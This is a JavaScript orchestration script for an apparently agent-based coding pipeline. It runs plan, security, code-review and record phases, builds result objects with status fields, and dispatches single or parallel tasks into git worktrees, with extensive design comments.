  // published, and an issue cannot be un-filed.
  if (BACKLOG_DESTINATION === 'file' && recordResult.backlog?.destination === 'github') {
    log(`${logPrefix}⚠ Recorder reported backlog → github, which config.backlog.destination 'file' does not permit — check what it published`)
  }

  // Both new blocks hand the Recorder file paths and rely on prompt text to
  // stop it writing to them — and verifyRecordLocation below opens with
  // `if (!ctx?.isMulti) return false`, so on a single-feature run, the
  // documented default, nothing inspects files_written at all. This does,
  // unconditionally. Non-blocking, same shape as the backlog-destination
  // warning above: the artifacts exist and the verdict is unaffected, but a
  // contract or a design document written by an agent is the operator's
  // decision made by inference, and only this line says it happened.
  // Normalized on both sides, and matched with sameFilePath rather than by
  // equality: a Recorder reporting `./docs/design/auth.md` or an absolute path
  // is the same mismatch normalizeIssuePath exists for everywhere else, and a
  // raw comparison simply misses it. The bidirectional match is right HERE and
  // wrong in detectDesignDrift above, because the directions differ: there a
  // loose match suppresses a report, here it prints one warning too many.
  const wroteProposalTargets = files
    .map(f => String(f || '').trim())
    .filter(f => {
      const n = normalizeIssuePath(f)
      return n.startsWith('docs/contracts/') || DESIGN_MAP.some(m => sameFilePath(f, m.doc))
    })
  if (wroteProposalTargets.length) {
    log(`${logPrefix}⚠ Recorder reported writing ${capList(wroteProposalTargets.map(f => collapseLines(f))).join(', ')} — contracts and mapped design documents are proposed as backlog items and never written by the Record phase. Check what it changed.`)
  }

  const misplaced = verifyRecordLocation(recordResult, plan, ctx)
  if (misplaced) {
    log(`${logPrefix}✗ RECORDER WROTE OUTSIDE ITS WORKTREE — expected ${plan.worktree_path}, reported ${recordResult.worktree_root}`)
    log(`${logPrefix}  Files: ${files.join(', ') || '(none reported)'}`)
  }

  return { recordMisplaced: misplaced, recordStatus: 'ok' }
}

// planOnly was used zero times across the eight runs issue #20 measured, and
// one of those tasks was restarted four times — every restart a correction to
// the approach, not to the code. The flag was documented and nothing ever
// pointed at a specific run and said "this was one of them". This does, after
// the fact, from the plan the Planner just returned.
//
// Advice, never a gate: it runs after Plan and changes nothing about what
// happens next. The string is composed from FIELD NAMES and fixed reason text
// only — never from the content of `conflicts` or `risks`, which is
// model-authored text that would land uncollapsed on the result object the
// caller prints.
//
// `NONE —` conflicts are excluded because agents/planner.md tells the Planner
// to report `NONE — <what you checked it against>` when it reconciled an
// artifact and found nothing: that is a clean reconciliation, and treating it
// as an unresolved decision would make this fire on every artifact-bearing run.
function recommendPlanReview(plan) {
  const reasons = []
  if (plan?.complexity === 'complex') reasons.push('complexity is `complex`')
  if (plan?.security_surface === 'elevated') reasons.push('security_surface is `elevated`')
  const conflicts = (Array.isArray(plan?.conflicts) ? plan.conflicts : [])
    .filter(c => !String(c ?? '').trim().startsWith('NONE —'))
  if (conflicts.length) reasons.push(`${conflicts.length} unresolved conflict(s) in \`conflicts\``)
  if (plan?.sizing?.fits_one_run === false) reasons.push('`sizing.fits_one_run` is false')
  if (!reasons.length) return null
  return `Worth planning first next time — ${reasons.join('; ')}. Re-issuing this task with \`planOnly: true\` returns the plan without implementing it, so the approach can be corrected before any code is written.`
}

// ── shapeResult ────────────────────────────

// approved leads the object — a caller checking the run's outcome shouldn't
// have to dig past everything else to find it.
function shapeResult(approved, plan, researchReport, securityReport, finalVerdict, surface, models, iteration, task, ctx, recordMisplaced, recordStatus, fullSuiteStatus, testScope, envStatus, issuesUnaccounted, isolation, cost) {
  return {
    approved,
    // Sits beside approved, not in stats, because it qualifies approved: under
    // scoped runs `approved: true` can rest on nothing wider than the files
    // this run touched. 'ran' | 'not_run' | 'disabled' | 'deferred_to_ship' —
    // see markFullSuite for why this is an enum and not a boolean.
    full_suite_status: fullSuiteStatus || 'not_run',
    // 'ok' | 'unknown' | 'unreproducible' — beside full_suite_status because it
    // qualifies the same thing: a rejection can be about an environment the
    // Coder could never build rather than about the diff. An enum for the
    // record_status reason — a boolean cannot separate "the environment was
    // fine" from "we never found out", and a failure indistinguishable from
    // success here is read as success. It annotates, it never blocks: see
    // markEnvUnreproducible and its call site.
    env_status: envStatus?.status || 'unknown',
    env_unresolved: envStatus?.unresolved || [],
    // Top-level and not inside `stats`, for the reason argued at COST_ENTRIES_MAX:
    // `stats` is a flat bag of scalars, this is a nested block with a per-entry
    // array and its own availability enum, and every field that QUALIFIES the
    // result rather than counting something already sits out here. Always
    // present and never null — an unmeasurable run carries an explicit
    // {status:'unavailable', total_output_tokens_delta:null, reason} rather than
    // a missing key a consumer would read as zero.
    cost: cost || COST_UNAVAILABLE,
    test_scope: testScope || 'full',
    // `record_misplaced: false` cannot express "the Recorder died and wrote
    // nothing" — the failure path satisfies it trivially, so a crashed Record
    // phase used to be indistinguishable from a clean one in this object. A
    // caller wanting to know whether the artifacts exist must read
    // record_status; record_misplaced only qualifies an 'ok'.
    record_status: recordStatus || 'skipped',
    record_misplaced: !!recordMisplaced,
    label: ctx.label,
    // Derived from the VERIFIED isolation object, never from the input flag:
    // a consumer reads this as "the operator's own tree was not written to",
    // and a flag says only what was asked for. It cannot read 'worktree'
    // unless verifyWorktreeProof returned ok. It describes where the pipeline
    // told the agents to work — where they actually wrote is still only
    // detected, by verifyAgentLocation, not contained.
    work_location: isolation ? 'worktree' : 'working_tree',
    worktree_path: plan.worktree_path || null,
    branch: plan.branch || null,
    verdict: finalVerdict,
    verification: finalVerdict.verification?.verdict || 'not_run',
    // A string or null, on the result object only — never a schema field.
    // PLAN_SCHEMA has 87 characters of headroom and this is derived, not
    // reported: the Planner already filled every field it reads.
    plan_review_recommended: recommendPlanReview(plan),
    // Top-level beside unproven, not buried in `plan`: both name something the
    // run did NOT settle, and a caller reading the outcome has to see an
    // unconfirmed decision without digging for it.
    conflicts: plan.conflicts || [],
    unproven: finalVerdict.unproven || [],
    attacks: Array.isArray(finalVerdict.attacks) ? finalVerdict.attacks : [],
    stats: {
      complexity: plan.complexity,
      securitySurface: surface,
      securityStatus: securityReport?.status || 'not_run',
      models,
      // Capped: on an exhausted run `iteration` has already been incremented
      // past the last pass, so `iteration + 1` would report one Code call more
      // than actually ran.
      coder_passes: Math.min(iteration + 1, MAX_FIX_LOOPS),
      // Issues sent to a fix pass that came back with no outcome entry — see
      // accountIssueOutcomes. A count, not a gate: it separates "the loop ran
      // out" from "the loop ran out and no pass would say what it answered".
      issues_unaccounted: issuesUnaccounted || 0,
      researched: !!researchReport,
      files_mapped: plan.codebase_context?.relevant_files?.length || 0,
      // null, not true, when the Planner returned no sizing block — "unrated"
      // has to stay distinguishable from "rated as fitting".
      fits_one_run: plan.sizing?.fits_one_run ?? null,
      // 'not_triggered' | 'reported' | 'expected_not_reported' — see
      // reconciliationStatus. Derived from the task text, not from the plan
      // alone, so an artifact-bearing brief that came back with nothing is
      // visible in the result and not only in the log.
      reconciliation: reconciliationStatus(task, plan),
    },
    plan,
    researchReport,
    securityReport,
    task,
  }
}

// A separate shape rather than shapeResult with a flag. Every verdict-derived
// field shapeResult carries — approved, verdict, verification, unproven,
// attacks, coder_passes — would be null or a lie here, and a flag parameter
// would still leave `approved` present on the object for a caller to misread
// as "the work happened and was rejected". This object has no `approved` key
// at all: `if (r.approved)` is falsy, and `r.approved === false` — the
// rejected-run test — correctly does not match. `mode` leads as the
// discriminator.
function shapePlanOnly(plan, researchReport, securityReport, surface, models, task, ctx, isolation, cost) {
  return {
    mode: 'plan-only',
    label: ctx.label,
    // Same derived field as shapeResult's. Present here too because a caller
    // comparing the two shapes should not have to special-case which one
    // carries the advice — and a plan-only run is where the advice was taken.
    plan_review_recommended: recommendPlanReview(plan),
    // Same derivation and the same caveat as shapeResult's — from the verified
    // object, never from the flag.
    work_location: isolation ? 'worktree' : 'working_tree',
    worktree_path: plan.worktree_path || null,
    branch: plan.branch || null,
    // Same block, same placement argument as shapeResult's. Carried here too
    // because a plan-only run spends real output tokens — a Planner call is the
    // single most expensive agent in the pipeline — and comparing what planning
    // cost against what the whole run cost is exactly why an operator asks.
    cost: cost || COST_UNAVAILABLE,
    stats: {
      complexity: plan.complexity,
      securitySurface: surface,
      securityStatus: securityReport?.status || 'not_run',
      models,
      researched: !!researchReport,
      files_mapped: plan.codebase_context?.relevant_files?.length || 0,
      fits_one_run: plan.sizing?.fits_one_run ?? null,
      // Same field, same derivation as shapeResult's — a plan-only run is where
      // issue #19 was reported, so this is the one it most needs to carry.
      reconciliation: reconciliationStatus(task, plan),
    },
    // Top-level: a plan-only run's whole output is the plan and what it left
    // undecided, and `suggested_tasks` below deliberately does not carry these.
    conflicts: plan.conflicts || [],
    suggested_tasks: plan.sizing?.fits_one_run === false
      ? (plan.sizing.suggested_split || []).filter(c => !c.depends_on?.length).map(c => ({ label: c.label, task: c.task }))
      : [],
    plan,
    researchReport,
    securityReport,
    task,
  }
}

// ═══════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════

// The single-task path and the multi-feature path share this function. Single
// mode calls it once with ctx.isMulti = false. Multi mode calls it N times
// through parallel(), one closure per feature — every let/const below is
// scoped inside the function, so N concurrent calls each get their own copy
// instead of racing on shared state. Never throws: a failure inside becomes a
// returned {error, ...} object for that feature, so one bad feature can't
// abort the others running alongside it under parallel().
async function runOneFeature(task, ctx) {
  try {
    const logPrefix = ctx.isMulti ? `[${ctx.label}] ` : ''

    log(`Budget: ${budgetRemaining() ?? 'unlimited'}`)
    log(`${logPrefix}Task: ${task.slice(0, 200)}${task.length > 200 ? '...' : ''}`)

    const logStage = (title) => {
      if (ctx.isMulti) log(`[${ctx.label}] ▸ ${title}`)
      else phase(title)
    }

    // Opened before the first phase so the run-start baseline is sampled before
    // any agent has run. ctx is a fresh object literal at all three call sites —
    // the multi dispatch map, the isolate:true path and the plain single-task
    // path — so this mutation cannot leak from one feature into another under
    // parallel(). `concurrent` is what tells every downstream renderer that the
    // deltas below overlap with sibling features sharing the same token pool.
    ctx.ledger = createCostLedger({ concurrent: (ctx.total || 1) > 1 })

    // Phase 1: Isolate (isolated/multi-feature runs only)
    const isolateResult = await phaseIsolate(task, ctx, logStage, logPrefix)
    if (isolateResult.error) return isolateResult
    const { isolation } = isolateResult

    // Phase 2: Research (opt-in)
    const { researchReport } = await phaseResearch(task, ctx, logStage, logPrefix)

    // Phase 3: Plan
    const planResult = await phasePlan(task, ctx, researchReport, isolation, logStage, logPrefix)
    if (planResult.error) return planResult
    if (planResult.resolutionRequired) return planResult
    const { plan, models, CTX, surface, DO_SECURITY, WORKTREE_BLOCK, scopedTests } = planResult

    const planReviewAdvice = recommendPlanReview(plan)
    if (planReviewAdvice) log(`${logPrefix}▸ ${planReviewAdvice}`)

    // Phase 4: Security
    const { securityReport, SECURITY_BLOCK } = await phaseSecurity(plan, models, ctx, WORKTREE_BLOCK, CTX, DO_SECURITY, logStage, logPrefix)

    if (PLAN_ONLY) {
      log(`${logPrefix}⏹ Plan-only run — stopped after Plan${securityReport ? ' + Security' : ''} on purpose. No code was written, no review ran, nothing was recorded.`)
      renderSplitPaste(plan.sizing, plan.conflicts).forEach(line => log(`${logPrefix}${line}`))
      if (plan.sizing?.fits_one_run !== false) log(`${logPrefix}The Planner rated this as one run — re-issue the same task without planOnly to implement it.`)
      // Sampled once here and reused for both the log line and the result, so
      // the two can never disagree about what the same run cost.
      const planOnlyCost = ctx.ledger.finish()
      log(`${logPrefix}${renderCostLine(planOnlyCost)}`)
      return shapePlanOnly(plan, researchReport, securityReport, surface, models, task, ctx, isolation, planOnlyCost)
    }

    // Phase 5: Code + Review
    const reviewResult = await phaseCodeReview(plan, models, ctx, WORKTREE_BLOCK, CTX, SECURITY_BLOCK, task, logStage, logPrefix, scopedTests)
    if (reviewResult.error) return reviewResult
    const { finalVerdict: rawFinalVerdict, iteration, downgraded } = reviewResult
    const coderSignals = { filesChanged: reviewResult.filesChanged || [], deviations: reviewResult.deviations || [] }

    // 'ran' outranks the configured intent: a Coder that ran the whole suite
    // under fullSuiteAt 'never' still ran it, and the status describes what
    // happened, not what was asked for.
    // The EFFECTIVE setting, not the configured one: under full-suite mode the
    // Coder was never told to skip anything, so reporting 'disabled' there would
    // describe an instruction that was never sent.
    const effectiveAt = scopedTests?.fullSuiteAt || DEFAULT_FULL_SUITE_AT
    const fullSuiteStatus = reviewResult.fullSuiteRan
      ? 'ran'
      : effectiveAt === 'never' ? 'disabled'
      : effectiveAt === 'ship' ? 'deferred_to_ship'
      : 'not_run'
    // Applied BEFORE phaseRecord so the review report the Recorder writes
    // carries the sentence too, rather than only the returned object.
    const suiteMarked = markFullSuite(rawFinalVerdict, fullSuiteStatus)
    if (fullSuiteStatus !== 'ran') {
      log(`${logPrefix}⚠ FULL SUITE NOT RUN (${fullSuiteStatus}) — ${FULL_SUITE_REASONS[fullSuiteStatus]}; only the files this run touched were tested.`)
    }

    // Read before the environment annotation and never recomputed after it: an
    // env_status derived from Coder-reported fields must be able to explain a
    // rejection, never to turn one into an approval.
    const approved = suiteMarked.status === 'approved'

    const envStatus = reviewResult.envStatus || { status: 'unknown', evidence: 'the review phase reported no environment status' }
    if (envStatus.status === 'unreproducible') {
      log(`${logPrefix}⚠ ENVIRONMENT NOT REPRODUCED (${envStatus.status}) — ${envStatus.evidence}`)
    } else if (envStatus.status !== 'ok') {
      log(`${logPrefix}⚠ ENVIRONMENT UNVERIFIED (${envStatus.status}) — ${envStatus.evidence}`)
    }
    const finalVerdict = approved ? suiteMarked : markEnvUnreproducible(suiteMarked, envStatus)

    // Phase 6: Record
    const { recordMisplaced, recordStatus } = await phaseRecord(approved, plan, finalVerdict, securityReport, task, ctx, WORKTREE_BLOCK, models, logStage, logPrefix, downgraded, coderSignals)

    // Unlike markFullSuite, this cannot be applied before Record — the fact it
    // reports is Record's outcome. `approved` above is deliberately not
    // recomputed from the result.
    const recordMarked = markRecordFailed(finalVerdict, recordStatus)

    // Sampled after Record, so this figure covers every agent the run paid for,
    // including the Recorder — unlike the earlier snapshot phaseRecord had to
    // compose into its own prompt. Taken once and reused for the log and the
    // result, so the two can never disagree.
    const cost = ctx.ledger.finish()
    log(`${logPrefix}${renderCostLine(cost)}`)

    // Phase 7: Shape result
    return shapeResult(approved, plan, researchReport, securityReport, recordMarked, surface, models, iteration, task, ctx, recordMisplaced, recordStatus, fullSuiteStatus, scopedTests?.mode || 'full', envStatus, reviewResult.issuesUnaccounted, isolation, cost)
  } catch (err) {
    // A thrown error inside one feature must not abort siblings running under
    // parallel() — return a failure shape instead of letting it propagate.
    log(`${ctx?.isMulti ? `[${ctx.label}] ` : ''}ERROR: ${err?.message || err}`)
    log(`${ctx?.isMulti ? `[${ctx.label}] ` : ''}If this looks like an LDO bug rather than the task, run /ldo-feedback — it redacts secrets and files a GitHub issue.`)
    return { error: String(err?.message || err), label: ctx?.label, task, approved: false }
  }
}

// ── DISPATCH ────────────────────────────────

let tasksList
try {
  tasksList = normalizeTasks(args)
} catch (err) {
  log(`ERROR: ${err.message}`)
  return { error: err.message }
}

if (tasksList) {
  // Parallel multi-feature mode. Each feature gets its own git worktree, created
  // by its own Isolate phase (the workflow script has no filesystem access, so
  // an agent still runs the command — but the orchestrator verifies the result
  // instead of believing the report).
  // Cost and merge-conflict handling are accepted trade-offs, not solved here —
  // this is comparable to N developers on N branches; conflicts are routine at
  // merge time, not something the orchestrator resolves.
  if (tasksList.length > MAX_PARALLEL_FEATURES) {
    log(`⚠ ${tasksList.length} features requested, exceeds maxParallelFeatures (${MAX_PARALLEL_FEATURES}) — likely unintentional, but proceeding.`)
  }

  log(`Multi-feature run: ${tasksList.length} feature(s), each isolated in its own git worktree — created and verified before planning starts.`)
  tasksList.forEach((t, i) => log(`  [${t.label}] ${t.task.slice(0, 100)}${t.task.length > 100 ? '...' : ''}`))

  const results = await parallel(tasksList.map((t, i) => () => runOneFeature(t.task, {
    index: i,
    total: tasksList.length,
    label: t.label,
    isMulti: true,
    worktreeHint: {
      suggestedPath: `.worktrees/${i + 1}-${t.label}`,
      suggestedBranch: `ldo/${i + 1}-${t.label}`,
    },
  })))

  const features = results.map((r, i) => r || { error: 'No result returned', label: tasksList[i].label, task: tasksList[i].task, approved: false })

  // Plan-only needs its own summary rather than a conditional threaded through
  // the one below: that one counts `!f.verdict` as failed, and a plan-only
  // feature legitimately has no verdict, so every planned feature would be
  // reported as a failure. There is also nothing to ship, so no /ldo-ship line.
  if (PLAN_ONLY) {
    const planned = features.filter(f => f.mode === 'plan-only').length
    const failed = features.filter(f => f.error).length

    log('')
    log(`Multi-feature plan-only summary: ${planned}/${features.length} planned, ${failed} failed`)
    features.forEach(f => {
      if (f.error) log(`  [${f.label}] ✗ ${f.error}`)
      else if (f.worktree_path) log(`  [${f.label}] ✓ planned in ${f.worktree_path}`)
      else log(`  [${f.label}] ✓ planned`)
      // Status first and total second, so an operator reading only the summary
      // sees an unavailable reading as such rather than inferring a cheap run
      // from a missing number.
      if (f.cost) log(`  [${f.label}] cost (${f.cost.status}): ${f.cost.total_output_tokens_delta === null ? 'not measured — the run still spent output tokens' : `${formatTokens(f.cost.total_output_tokens_delta)} output tokens`}`)
    })
    { const r = budgetRemaining(); if (r) log(`Budget remaining: ${r}`) }

    return {
      mode: 'multi-plan-only',
      summary: { total: features.length, planned, failed },
      features,
    }
  }

  const approved = features.filter(f => f.approved).length
  const failed = features.filter(f => f.error || !f.verdict).length
  const changesRequested = features.length - approved - failed

  log('')
  log(`Multi-feature summary: ${approved}/${features.length} approved, ${changesRequested} changes requested, ${failed} failed`)
  features.forEach(f => {
    if (f.worktree_path) log(`  [${f.label}] ${f.approved ? '✓' : '✗'} → run /ldo-ship from ${f.worktree_path} (already on ${f.branch})`)
    else log(`  [${f.label}] ✗ ${f.error || 'no worktree — see error above'}`)
    if (f.record_misplaced) log(`  [${f.label}] ⚠ Recorder wrote outside its worktree — check the main checkout before you git add`)
    // Reported even on an approved feature: a dead Recorder leaves the review
    // report and architecture doc unwritten while every other field still says
    // the run succeeded, and the ⚠ line inside phaseRecord went to the log of
    // a phase the operator may never scroll back to.
    if (f.record_status === 'failed') log(`  [${f.label}] ⚠ Recorder failed — review report and architecture doc were not written`)
    // Same reasoning as the record_status line above: the ⚠ inside
    // runOneFeature went to a per-feature log the operator may never scroll
    // back to, and this one qualifies the ✓ printed two lines up.
    if (f.full_suite_status && f.full_suite_status !== 'ran') log(`  [${f.label}] ⚠ FULL SUITE NOT RUN (${f.full_suite_status}) — only the files this run touched were tested`)
    // Same reasoning again, and it matters most on a ✗: this line is what says
    // the rejection may be about an environment that was never built, not the
    // code, before the operator starts reading the diff for a defect.
    if (f.env_status === 'unreproducible') log(`  [${f.label}] ⚠ ENVIRONMENT NOT REPRODUCED — this result may be about the environment rather than the code`)
    // Same reasoning as the lines above, plus one specific to this figure: under
    // parallel features the pool is shared, so these per-feature totals overlap
    // and deliberately do not sum to the run's total.
    if (f.cost) log(`  [${f.label}] cost (${f.cost.status}): ${f.cost.total_output_tokens_delta === null ? 'not measured — the run still spent output tokens' : `${formatTokens(f.cost.total_output_tokens_delta)} output tokens`}`)
  })
  { const r = budgetRemaining(); if (r) log(`Budget remaining: ${r}`) }

  return {
    mode: 'multi',
    summary: { total: features.length, approved, changesRequested, failed },
    features,
  }
}

// Single-task mode.
const singleTask = args?.task || (typeof args === 'string' ? args : null)

if (!singleTask) {
  log('ERROR: No task provided. Workflow({name:"ldo", args:{task:"..."}}) or {tasks:[...]} for parallel features.')
  // A resume lands here far more often than a genuine typo does, and it lands
  // here silently: a running workflow receives `args` and nothing else — it is
  // never told its own runId — so it structurally cannot read
  // .claude/ldo-args/<runId>.json on the operator's behalf and reconstruct
  // what it was asked to do. Some harness builds print a completion line
  // suggesting `Workflow({scriptPath, resumeFromRunId})` with no args at all;
  // followed literally, that returns in milliseconds having spawned zero
  // agents, which reads as a resume that found nothing to do rather than as a
  // call that was never given a task. Naming it here is the only place the
  // operator can learn it, so the error teaches the fix.
  log('ERROR: If you meant to RESUME a run, resumeFromRunId alone is a no-op — a running workflow only ever sees `args` and never learns its own runId, so it cannot look your arguments up for you. Pass the ORIGINAL args alongside it: Workflow({name:"ldo", args:<the object from .claude/ldo-args/<runId>.json>, resumeFromRunId:"<runId>"}). A run recorded per /ldo-resume already has that file on disk.')
  return { error: 'No task provided. If this was a resume, resumeFromRunId alone is a no-op — pass the original args from .claude/ldo-args/<runId>.json alongside it, because the workflow never learns its own runId and cannot look them up.' }
}

// isolate: true runs the single task through the same worktree machinery the
// multi-feature path uses — the Coder writes into its own worktree instead of
// the operator's working tree. Without it, the pipeline edits the tree the
// operator may also be editing, and nothing but memory prevents a collision.
if (args?.isolate) {
  const label = slugify(singleTask, 'task')
  log(`Isolated run: the pipeline will work in its own git worktree, not this working tree. The worktree is created and verified first — the run fails rather than falling back to this tree.`)
  return await runOneFeature(singleTask, {
    index: 0,
    total: 1,
    label,
    isMulti: true,
    worktreeHint: {
      suggestedPath: `.worktrees/${label}`,
      suggestedBranch: `ldo/${label}`,
    },
  })
}

// No Coder runs in plan-only mode and the Planner only reads, so warning the
// operator off their own tree would be telling them something untrue.
if (PLAN_ONLY) log('Plan-only run: nothing will be written to your working tree.')
else log(`⚠ Working tree mode: the Coder edits THIS working tree directly. Avoid editing files here until the run finishes — or pass isolate: true to run in a separate worktree.`)
return await runOneFeature(singleTask, { isMulti: false })
